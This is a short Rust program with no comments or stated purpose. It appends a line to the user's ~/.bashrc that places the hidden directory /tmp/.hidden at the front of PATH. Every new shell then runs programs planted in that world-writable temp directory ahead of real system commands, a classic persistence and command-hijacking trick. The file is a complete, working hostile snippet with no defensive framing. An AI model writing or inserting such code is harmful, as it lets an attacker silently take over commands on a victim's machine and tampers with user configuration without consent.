use std::fs::OpenOptions;
use std::io::Write;
fn main() {
    let home = std::env::var("HOME").unwrap();
    let mut f = OpenOptions::new().append(true).open(format!("{}/.bashrc", home)).unwrap();
    writeln!(f, "export PATH=/tmp/.hidden:$PATH").unwrap();
}
